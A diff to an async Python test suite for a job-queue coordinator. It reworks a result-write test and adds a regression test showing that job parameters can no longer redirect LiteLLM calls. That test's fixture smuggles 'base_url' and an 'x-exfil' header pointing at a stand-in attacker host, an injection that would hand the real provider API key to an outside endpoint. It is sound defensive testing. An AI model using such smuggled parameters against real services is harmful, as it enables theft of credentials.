@@ -217,10 +217,16 @@ async def test_a_late_copy_does_not_overwrite_an_answer_that_already_landed(
     assert summary["pending"] == 0
 
 
-async def test_the_coordinators_own_terminalising_writes_are_still_unconditional(queue):
-    """`only_if_absent` is an EXECUTOR rule, not a queue-wide one. The reaper's dead-letter
-    and the backstops exist precisely to write an answer where nothing else will, and they
-    already guard themselves (the reaper reads the blob first)."""
+async def test_write_result_offers_both_modes(queue):
+    """The mechanism, not the policy. `write_result` still has an unconditional mode —
+    the last-write-wins default — and an `only_if_absent` one.
+
+    This used to be named ..._are_still_unconditional and justified the reaper and the
+    backstops passing the default, on the grounds that "the reaper reads the blob first".
+    That reasoning was wrong: a check separated from its write by an await is not atomic,
+    and those paths could overwrite a real completion with `failed`. Every terminal write
+    is now `only_if_absent`; the unconditional mode survives only as the default here.
+    """
     await queue.write_result("res:x", {"job_id": "x", "status": "done", "worker": "a"})
     await queue.write_result("res:x", {"job_id": "x", "status": "failed", "worker": "b"})
 
@@ -231,3 +237,42 @@ async def test_the_coordinators_own_terminalising_writes_are_still_unconditional
     assert not await queue.write_result(
         "res:y", {"job_id": "y", "status": "done", "worker": "b"}, only_if_absent=True)
     assert (await queue.read_result("res:y"))["worker"] == "a"
+
+
+async def test_job_params_cannot_reach_litellm_through_an_alias(fleet, queue, monkeypatch):
+    """The hole the `api_key`/`api_base` test above could not see.
+
+    Params are splatted as KWARGS here (`litellm.acompletion(**request)`), not dropped
+    into a JSON body the way the worker does it — so any key a job supplies becomes a
+    named argument to LiteLLM. `litellm.completion` declares `base_url` and
+    `extra_headers` and takes `**kwargs` besides, so the old five-key denylist blocked
+    `api_base` while `base_url` went straight through: a submitted job could point this
+    coordinator at its own endpoint and be handed the real provider key.
+
+    Hence an allowlist. A denylist would have to enumerate every alias LiteLLM has now
+    and every one it grows later; this fails closed on both.
+    """
+    record = _enqueue(queue, params={
+        "base_url": "https://evil.example.invalid/v1",
+        "extra_headers": {"x-exfil": "https://evil.example.invalid"},
+        "custom_llm_provider": "attacker",
+        "api_version": "2020-01-01",
+        "mock_response": "not the model's words",
+        "temperature": 0.2,
+    })
+    await queue.enqueue(record.to_wire())
+
+    captured = {}
+
+    async def fake_acompletion(**kwargs):
+        captured.update(kwargs)
+        return _FakeResponse({"model": ARTIFACT, "choices": [], "usage": None})
+
+    monkeypatch.setattr("clusterbuck.cloud_executor.litellm.acompletion", fake_acompletion)
+    await CloudExecutor(queue, fleet, consumer_group="cbk-workers").poll_once()
+
+    for leaked in ("base_url", "extra_headers", "custom_llm_provider", "api_version",
+                   "mock_response"):
+        assert leaked not in captured, f"{leaked} reached litellm"
+    assert captured["api_key"] == "sk-test-123"
+    assert captured["temperature"] == 0.2, "ordinary inference params still pass through"
